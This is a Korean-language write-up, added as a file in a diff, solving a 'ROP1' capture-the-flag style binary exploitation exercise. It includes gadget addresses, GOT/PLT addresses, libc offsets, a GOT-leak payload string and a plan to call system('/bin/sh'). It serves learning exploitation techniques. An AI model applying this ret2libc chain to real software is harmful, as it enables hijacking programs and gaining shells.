@@ -1,0 +1,85 @@
+ROP1 풀이
+http://cdor1.tistory.com/91
+
+
+어셈분석
+버퍼 30위치에 입력받음
+
+입력 가능한 함수는 read 함수
+
+ROPgadget 수집
+0x080482e9 : pop ebx ; ret
+말고 pop eax , ecx, edx가 없음...
+
+다른 방법을 생각해보자
+
+
+
+차라리 rtl로 풀어볼까,
+
+
+최대 입력바이트가 049(73) 바이트 인것을 감안하고 스택을 그리면 
+
+buf[48]
+read.ebp
+read.ret 
+
+이 모양에서,
+
+buf[48]
+dummy 4b
+write@plt
+main
+1
+write@got 
+4
+
+48
+4
+system
+dummy
+binsh
+
+이 모양으로 만들면 된다.
+but, system 함수를 실행하려면 offset 계산을 통해 실제 함수의 실행 주소를 구해야 한다.
+got leak을 통해 다른 함수의 실제 실행 주소를 구하고, offset 계산값을 대입하여 system을 찾아보자.
+
+
+ret = 0x80482d2
+popret = 0x80482e9
+pop3ret = 0x80484c9
+pop4ret = 0x80484c8
+pop2ret = 0x80484ca
+addesp_12 = 0x80482e6
+addesp_16 = 0x80483a5
+
+0x08048320  write@plt
+0x0804a014  write@GOT
+0x0804843b main 
+
+0xf7f79d4c
+
+0xf7ef4460 <write>
+
+0xf7ef43e0 <read> write - 0x80
+
+0xf7e57310 <system> write - 9D150
+
+libc = ELF("/lib/i386-linux-gnu/libc.so.6")
+hex(libc.symbols["read"])
+
+rtl로 출력함수를 불러 온 다음, 함수의 plt 주소를 인자로 주어 got를 출력시켜 프로그램이 실행될 떄의 함수주소를 찾아낼 수 있다.
+
+"a"*52 + write@plt + dummy4 + 0x1 + write@got + 0x4 처럼 인자를 짜서 leak 이 가능한지 확인해보자.
+
+"a"*52 + p32(0x08048320) + "a"*4" + p32(1) + p32(0x0804a014) +p32(4)
+
+프로그램 구성
+1. system 함수의 오프셋 준비. 
+2. lack한 write의 got와 오프셋을 계산하여 system 함수의 실제 실행주소 찾기
+3. /bin/sh/ 의 오프셋 준비
+3. system 함수 호출
+
+
+
+
